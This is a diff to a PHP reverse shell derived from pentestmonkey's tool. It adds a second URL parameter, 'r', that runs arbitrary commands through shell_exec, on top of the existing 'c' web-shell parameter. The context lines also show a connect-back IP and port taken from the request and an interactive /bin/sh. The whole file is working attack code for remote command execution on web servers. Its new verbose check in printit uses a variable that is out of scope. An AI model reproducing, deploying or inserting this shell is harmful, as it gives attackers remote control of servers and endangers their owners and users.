@@ -44,17 +44,17 @@
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 // 
-// Changes by GramThanos
-// -----
+// Smart Improvements (by Gramthanos)
+// ----------------------------------
 // IP and Port definition from URL parameters or CMD arguments (PHP >= 4.3.0)
-//
+// Command excecution from URL parameters
 
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 set_time_limit (0);
-$VERSION = "1.0";
+$VERSION = "2.0-smart";
 $ip = '127.0.0.1';  // DEFAULT
 $port = 1234;       // DEFAULT
 $chunk_size = 1400;
@@ -63,11 +63,16 @@ $error_a = null;
 $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
+$verbose = true;
 
 // Just run command
 if (isset($_REQUEST['c'])) {
 	header('Content-Type:text/plain');
 	die(shell_exec($_REQUEST['c']));
+}
+if (isset($_REQUEST['r'])) {
+	header('Content-Type:text/plain');
+	die(shell_exec($_REQUEST['r'] . '2>&1'));
 }
 
 // Get IP and Port from URL parameters
@@ -78,6 +83,8 @@ if (isset($argv)) {
 	if (isset($argv[1])) $ip = $argv[1];
 	if (isset($argv[2])) $port = $argv[2];
 }
+
+
 
 //
 // Daemonise ourself if possible to avoid zombies later
@@ -205,12 +212,9 @@ proc_close($process);
 // Like print, but does nothing if we've daemonised ourself
 // (I can't figure out how to redirect STDOUT like a proper daemon)
 function printit ($string) {
-	if (!isset($daemon) || !$daemon) {
-		print "$string\n";
+	if ($verbose && (!isset($daemon) || !$daemon)) {
+		print("$string\n");
 	}
 }
 
-?> 
-
-
-
+?>
